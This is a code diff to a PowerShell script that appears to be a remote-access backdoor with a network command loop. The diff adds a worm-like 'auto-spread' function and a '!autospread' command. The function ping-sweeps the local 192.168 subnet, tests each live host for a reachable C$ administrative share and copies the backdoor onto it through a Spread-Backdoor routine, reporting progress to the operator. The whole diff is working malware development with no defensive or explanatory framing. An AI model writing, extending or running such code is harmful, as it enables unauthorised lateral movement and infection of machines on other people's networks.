@@ -147,7 +147,56 @@ function Connect-ZiPo {
     }
 }
 
-    
+    function Invoke-AutoSpread {
+    param (
+        [System.Net.Sockets.NetworkStream]$stream
+    )
+
+    $sw = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
+    $sw.AutoFlush = $true
+
+    $sw.WriteLine("[*] Starting auto-spread...")
+
+    # Получаем IP текущей машины
+    $myIP = (Get-NetIPAddress -AddressFamily IPv4 |
+        Where-Object { $_.IPAddress -match '^192\.168\.' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+    $subnet = ($myIP -replace '\.\d+$', '.')
+
+    $alive = @()
+
+    # Сканируем подсеть
+    foreach ($i in 1..254) {
+        $ip = "$subnet$i"
+        if ($ip -ne $myIP) {
+            try {
+                $ping = New-Object System.Net.NetworkInformation.Ping
+                if ($ping.Send($ip, 200).Status -eq "Success") {
+                    $sw.WriteLine("[+] Host alive: $ip")
+                    $alive += $ip
+                }
+            } catch {}
+        }
+    }
+
+    # Пробуем сделать spread на каждый IP с открытым C$
+    foreach ($ip in $alive) {
+        $cpath = "\\$ip\C$\Users\Public"
+        if (Test-Path $cpath) {
+            $sw.WriteLine("[*] Spreading to $ip...")
+            try {
+                $result = Spread-Backdoor -targetIP $ip
+                $sw.WriteLine($result)
+            } catch {
+                $sw.WriteLine("[ERROR] Failed to spread to $ip: $($_.Exception.Message)")
+            }
+        } else {
+            $sw.WriteLine("[ ] No access to $ip C$")
+        }
+    }
+
+    $sw.WriteLine("[*] Auto-spread complete.")
+}
+
 
     function Test-Ports {
     param (
@@ -539,6 +588,10 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
+                        $response = ""
+                    }
+                    elseif ($cmd -eq "!autospread") {
+                        Invoke-AutoSpread -stream $stream
                         $response = ""
                     }
                     elseif ($cmd.StartsWith("spread")) {
